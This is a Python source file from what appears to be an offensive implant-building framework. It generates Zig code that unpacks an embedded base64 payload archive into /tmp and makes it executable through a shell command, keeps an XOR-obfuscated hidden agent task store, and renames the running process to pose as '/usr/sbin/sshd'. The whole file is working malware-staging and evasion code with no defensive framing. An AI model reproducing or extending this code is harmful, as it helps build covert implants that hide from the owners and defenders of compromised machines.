#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Zig code emitters for prestage modules."""

from __future__ import annotations

from typing import Any, Dict

from core.payload_generation.prestage.agent_store_context import resolve_agent_store_context
from core.payload_generation.prestage.zip_context import resolve_zip_prestage_context

HELPER_MARKER = "// @kitty_helpers"
BODY_MARKER = "// @kitty_body"


def _split_helpers_body(helpers: str, body: str) -> str:
    return f"{HELPER_MARKER}\n{helpers.strip()}\n{BODY_MARKER}\n{body.strip()}"


def emit_extract_zip(module=None, context: Dict[str, Any] = None) -> str:
    ctx = resolve_zip_prestage_context(module, context)
    zip_b64 = str(ctx.get("zip_b64") or "").strip()
    if not zip_b64:
        return "// extract_zip: set prestage_archive on payload"

    extract_to = str(ctx.get("extract_to") or "").strip()
    cleanup = bool(ctx.get("cleanup_zip"))
    chmod_exec = bool(ctx.get("chmod_exec"))

    helpers = """
fn kittyZipInflate(alloc: mem.Allocator, comp: []const u8, method: u16, expected: u32) ![]u8 {
    if (method == 0) {
        if (expected != 0 and comp.len != expected) return error.ZipSizeMismatch;
        return try alloc.dupe(u8, comp);
    }
    if (method == 8) {
        var stream = std.io.fixedBufferStream(comp);
        var decompress = std.compress.flate.Decompress.init(stream.reader(), .{ .window_bits = -15 });
        var out_list: std.ArrayList(u8) = .empty;
        errdefer out_list.deinit(alloc);
        var buf: [8192]u8 = undefined;
        while (true) {
            const n = decompress.read(&buf) catch |err| switch (err) {
                error.EndOfStream => break,
                else => return err,
            };
            if (n == 0) break;
            try out_list.appendSlice(alloc, buf[0..n]);
        }
        if (expected != 0 and out_list.items.len != expected) return error.ZipSizeMismatch;
        return try out_list.toOwnedSlice(alloc);
    }
    return error.ZipUnsupportedMethod;
}

fn kittyExtractZipInMemory(alloc: mem.Allocator, zip_data: []const u8, dest_root: []const u8) !void {
    try std.fs.cwd().makePath(dest_root);
    var pos: usize = 0;
    while (pos + 30 <= zip_data.len) {
        if (zip_data[pos] != 0x50 or zip_data[pos + 1] != 0x4b or zip_data[pos + 2] != 0x03 or zip_data[pos + 3] != 0x04) break;
        const comp_method = std.mem.readInt(u16, zip_data[pos + 8 .. pos + 10], .little);
        const comp_size = std.mem.readInt(u32, zip_data[pos + 18 .. pos + 22], .little);
        const uncomp_size = std.mem.readInt(u32, zip_data[pos + 22 .. pos + 26], .little);
        const name_len = std.mem.readInt(u16, zip_data[pos + 26 .. pos + 28], .little);
        const extra_len = std.mem.readInt(u16, zip_data[pos + 28 .. pos + 30], .little);
        const header_end = pos + 30;
        if (header_end + name_len > zip_data.len) return error.ZipTruncated;
        const name = zip_data[header_end .. header_end + name_len];
        const data_start = header_end + name_len + extra_len;
        if (data_start + comp_size > zip_data.len) return error.ZipTruncated;
        const comp = zip_data[data_start .. data_start + comp_size];
        if (name.len > 0 and name[name.len - 1] == '/') {
            const dir_path = try std.fs.path.join(alloc, &[_][]const u8{ dest_root, name[0 .. name.len - 1] });
            defer alloc.free(dir_path);
            try std.fs.cwd().makePath(dir_path);
        } else {
            const out_path = try std.fs.path.join(alloc, &[_][]const u8{ dest_root, name });
            defer alloc.free(out_path);
            if (std.fs.path.dirname(out_path)) |parent| try std.fs.cwd().makePath(parent);
            const payload = try kittyZipInflate(alloc, comp, comp_method, uncomp_size);
            defer alloc.free(payload);
            try std.fs.cwd().writeFile(.{ .sub_path = out_path, .data = payload });
        }
        pos = data_start + comp_size;
    }
}
""".strip()

    body = f"""
    var _kitty_extract_root: []const u8 = "";
    {{
        const alloc = std.heap.page_allocator;
        const raw = b64Decode(alloc, "{zip_b64}") catch return;
        defer alloc.free(raw);
        var extract_root = {extract_to!r};
        if (extract_root.len == 0) {{
            extract_root = std.fmt.allocPrint(alloc, "/tmp/ks_{{d}}", .{{@as(u64, @intCast(std.time.timestamp()))}}) catch return;
        }} else {{
            extract_root = alloc.dupe(u8, extract_root) catch return;
        }}
        kittyExtractZipInMemory(alloc, raw, extract_root) catch {{
            if ({str(cleanup).lower()}) std.fs.cwd().deleteTree(extract_root) catch {{}};
            alloc.free(extract_root);
            return;
        }};
        if ({str(chmod_exec).lower()} and builtin.os.tag != .windows) {{
            if (std.fmt.allocPrint(alloc, "chmod -R u+rwx {{s}}", .{{extract_root}})) |cmd| {{
                defer alloc.free(cmd);
                if (execShell(alloc, cmd)) |out| defer alloc.free(out);
            }} else |_| {{}}
        }}
        _kitty_extract_root = extract_root;
    }}
""".strip()

    return _split_helpers_body(helpers, body)


def emit_agent_store(module=None, context: Dict[str, Any] = None) -> str:
    cfg = resolve_agent_store_context(module, context)
    store_path = cfg["store_path"]
    secret = cfg["store_secret"].replace("\\", "\\\\").replace('"', '\\"')

    if store_path:
        path_lit = store_path.replace("\\", "\\\\").replace('"', '\\"')
        path_setup = f'store_path = try alloc.dupe(u8, "{path_lit}");'
    else:
        path_setup = """
        const base = if (builtin.os.tag == .windows)
            (try std.process.getEnvVarOwned(alloc, "TEMP"))
        else
            (try std.process.getEnvVarOwned(alloc, "TMPDIR"));
        defer alloc.free(base);
        store_path = try std.fmt.allocPrint(alloc, "{s}/.kitty_store", .{base});
""".strip()

    helpers = f"""
const KittyAgentStore = struct {{
    path: []const u8,
    secret: []const u8,

    fn deriveKey(secret: []const u8, salt: *const [16]u8) [32]u8 {{
        var out: [32]u8 = undefined;
        _ = std.crypto.pwhash.pbkdf2(out[0..], secret, salt[0..], 120000, std.crypto.auth.hmac.sha2.HmacSha256);
        return out;
    }}

    fn xorStream(data: []u8, key: []const u8) void {{
        for (data, 0..) |*b, i| b.* ^= key[i % key.len];
    }}

    fn init(alloc: mem.Allocator, path: []const u8, secret: []const u8) !@This() {{
        const owned = try alloc.dupe(u8, path);
        errdefer alloc.free(owned);
        var self = @This(){{ .path = owned, .secret = secret }};
        std.fs.cwd().access(owned, .{{}}) catch {{
            try self.save(alloc, "{{\\"version\\":1,\\"tasks\\":{{}}}}");
        }};
        return self;
    }}

    fn save(self: @This(), alloc: mem.Allocator, plain: []const u8) !void {{
        var salt: [16]u8 = undefined;
        std.crypto.random.bytes(&salt);
        const key = deriveKey(self.secret, &salt);
        var payload = try alloc.dupe(u8, plain);
        defer alloc.free(payload);
        xorStream(payload, &key);
        var blob = try alloc.alloc(u8, 16 + payload.len);
        defer alloc.free(blob);
        @memcpy(blob[0..16], &salt);
        @memcpy(blob[16..], payload);
        try std.fs.cwd().writeFile(.{{ .sub_path = self.path, .data = blob }});
        _ = alloc;
    }}
}};

var _kitty_store: ?KittyAgentStore = null;
""".strip()

    body = f"""
    {{
        const alloc = std.heap.page_allocator;
        var store_path: []const u8 = undefined;
        {path_setup}
        _kitty_store = KittyAgentStore.init(alloc, store_path, "{secret}") catch null;
    }}
""".strip()

    return _split_helpers_body(helpers, body)


def emit_hide_argv(module=None, context: Dict[str, Any] = None) -> str:
    fake = "/usr/sbin/sshd"
    if module is not None:
        fake = str(getattr(getattr(module, "fake_name", None), "value", getattr(module, "fake_name", fake)) or fake)
    fake_short = fake[:15].replace("\\", "\\\\").replace('"', '\\"')

    body = f"""
    if (builtin.os.tag == .linux) {{
        var name_buf: [16]u8 = undefined;
        @memset(&name_buf, 0);
        const copy_len = @min(@as(usize, {len(fake_short)}), name_buf.len - 1);
        @memcpy(name_buf[0..copy_len], "{fake_short}");
        if (@hasDecl(std.c, "prctl")) _ = std.c.prctl(15, @intFromPtr(&name_buf), 0, 0, 0);
    }}
""".strip()
    return body
